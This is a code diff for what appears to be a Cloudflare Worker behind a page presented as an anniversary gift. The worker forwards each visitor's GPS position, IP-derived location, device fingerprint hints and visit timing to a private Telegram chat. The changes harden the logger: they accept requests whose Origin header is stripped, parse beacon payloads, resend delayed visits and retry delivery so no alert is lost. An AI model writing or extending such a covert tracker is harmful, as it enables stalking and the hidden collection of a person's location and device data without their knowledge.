@@ -21,7 +21,7 @@
  */
 
 const ALLOWED_ORIGINS = ["https://nassaranwar-boop.github.io"];
-const WORKER_VERSION = "2026-09-20-FULL-8";
+const WORKER_VERSION = "2026-09-20-FULL-9";
 
 const RECENT = new Map();
 const RATE_WINDOW_MS = 4000;
@@ -29,22 +29,34 @@ const RATE_WINDOW_MS = 4000;
 export default {
   async fetch(request, env, ctx) {
     const origin = request.headers.get("Origin") || "";
+    const referer = request.headers.get("Referer") || "";
     const cors = corsHeaders(origin);
 
+    // Preflight.
     if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });
+
+    // A plain GET is a health check, so you can open the URL to confirm the deploy.
+    if (request.method === "GET") return json({ ok: true, version: WORKER_VERSION, hint: "POST JSON to log a visit" }, 200, cors);
+
     if (request.method !== "POST") return json({ ok: false, error: "method_not_allowed" }, 405, cors);
-    if (!ALLOWED_ORIGINS.includes(origin)) return json({ ok: false, error: "forbidden_origin" }, 403, cors);
 
-    const ct = request.headers.get("Content-Type") || "";
-    if (!ct.toLowerCase().includes("application/json"))
-      return json({ ok: false, error: "unsupported_media_type" }, 415, cors);
+    // Allow the site by Origin, or by Referer when a privacy mode strips Origin.
+    const okOrigin = ALLOWED_ORIGINS.includes(origin)
+      || (!origin && ALLOWED_ORIGINS.some(o => referer.indexOf(o) === 0));
+    if (!okOrigin) return json({ ok: false, error: "forbidden_origin" }, 403, cors);
 
+    // Parse JSON regardless of the declared content-type (sendBeacon and some
+    // browsers send text/plain); reject only if it genuinely is not JSON.
     let body;
     try { body = await request.json(); }
-    catch (e) { return json({ ok: false, error: "invalid_json" }, 400, cors); }
+    catch (e) {
+      try { body = JSON.parse(await request.text()); }
+      catch (e2) { return json({ ok: false, error: "invalid_json" }, 400, cors); }
+    }
     if (!body || typeof body !== "object" || Array.isArray(body))
       return json({ ok: false, error: "invalid_payload" }, 400, cors);
 
+    // Light rate limit (per edge isolate; best-effort abuse guard only).
     const key = request.headers.get("CF-Connecting-IP") || "anon";
     const now = Date.now();
     const prev = RECENT.get(key) || 0;
@@ -57,47 +69,59 @@ export default {
 
     const cf = request.cf || {};
     const headers = request.headers;
-    const message = await buildMessage(body, cf, headers);
 
-    try {
-      const tg = await fetch(
-        `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-        { method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text: message,
-            parse_mode: "HTML", disable_web_page_preview: true }) }
-      );
-      if (!tg.ok) {
-        let desc = "";
-        try { const j = await tg.json(); desc = (j && j.description) || ""; } catch (e) {}
-        return json({ ok: false, error: "telegram_failed", status: tg.status, detail: desc }, 502, cors);
-      }
-    } catch (e) {
-      return json({ ok: false, error: "telegram_unreachable" }, 502, cors);
-    }
+    let message;
+    try { message = await buildMessage(body, cf, headers); }
+    catch (e) { message = "🔔 ANNIVERSARY GIFT OPENED\n(A visit arrived but formatting failed.)\nWorker: " + WORKER_VERSION; }
+
+    const sent = await sendTelegram(env, message);
+    if (!sent.ok) return json({ ok: false, error: "telegram_failed", status: sent.status, detail: sent.desc }, 502, cors);
 
     // A tappable map pin, when GPS was shared (best-effort; never fails the call).
     try {
       const g = body.gps;
       if (g && g.available && typeof g.latitude === "number" && typeof g.longitude === "number") {
-        const send = fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        const loc = fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendLocation`, {
           method: "POST", headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: env.TELEGRAM_CHAT_ID,
             latitude: g.latitude, longitude: g.longitude,
             horizontal_accuracy: (typeof g.accuracy === "number" ? Math.min(1500, Math.max(0, g.accuracy)) : undefined)
           })
-        });
-        if (ctx && ctx.waitUntil) ctx.waitUntil(send.catch(() => {})); else await send.catch(() => {});
+        }).catch(() => {});
+        if (ctx && ctx.waitUntil) ctx.waitUntil(loc); else await loc;
       }
     } catch (e) {}
 
-    // Ask Chromium for high-entropy hints on the next request too.
     const resp = json({ ok: true, version: WORKER_VERSION }, 200, cors);
     resp.headers.set("Accept-CH",
       "Sec-CH-UA-Platform-Version, Sec-CH-UA-Model, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Arch, Sec-CH-UA-Bitness");
     return resp;
   }
 };
+
+/* Send to Telegram as HTML; if Telegram rejects the entities (e.g. a long
+   message truncated mid-tag), resend the same text as plain text so the
+   alert is never lost. */
+async function sendTelegram(env, text) {
+  const url = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+  async function post(payload) {
+    try {
+      const r = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+      let desc = "";
+      if (!r.ok) { try { const j = await r.json(); desc = (j && j.description) || ""; } catch (e) {} }
+      return { ok: r.ok, status: r.status, desc };
+    } catch (e) {
+      return { ok: false, status: 0, desc: "unreachable" };
+    }
+  }
+  const first = await post({ chat_id: env.TELEGRAM_CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: true });
+  if (first.ok) return first;
+  // Retry as plain text (strip tags + unescape) — covers any HTML-parse error.
+  const plain = text.replace(/<[^>]*>/g, "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
+  const second = await post({ chat_id: env.TELEGRAM_CHAT_ID, text: plain, disable_web_page_preview: true });
+  return second.ok ? second : first;
+}
 
 /* ---------------- http helpers ---------------- */
 
@@ -246,7 +270,7 @@ async function buildMessage(b, cf, headers) {
 
   // ---- VISIT ----
   out += "\n🟢 <b>VISIT</b>\n";
-  out += "Type: " + (isReopen ? "REOPEN / RETURN" : "INITIAL VISIT") + "\n";
+  out += "Type: " + (isReopen ? "REOPEN / RETURN" : "INITIAL VISIT") + (b.queuedResend ? " (delayed resend)" : "") + "\n";
   out += "Time (UTC): " + esc(new Date().toISOString()) + "\n";
   if (b.localTime) out += "Client time: " + val(b.localTime) + "\n";
   if (b.sessionId) out += "Session: " + val(b.sessionId) + "\n";
@@ -389,6 +413,10 @@ async function buildMessage(b, cf, headers) {
   out += "Worker: " + WORKER_VERSION + "\n";
   out += "Permission state: " + val(b.locationPermission) + "\n";
 
-  if (out.length > 4090) out = out.slice(0, 4085) + "\n…";
+  if (out.length > 4090) {
+    let cut = out.lastIndexOf("\n", 4000);
+    if (cut < 3000) cut = 4000;
+    out = out.slice(0, cut) + "\n… (truncated)";
+  }
   return out;
 }
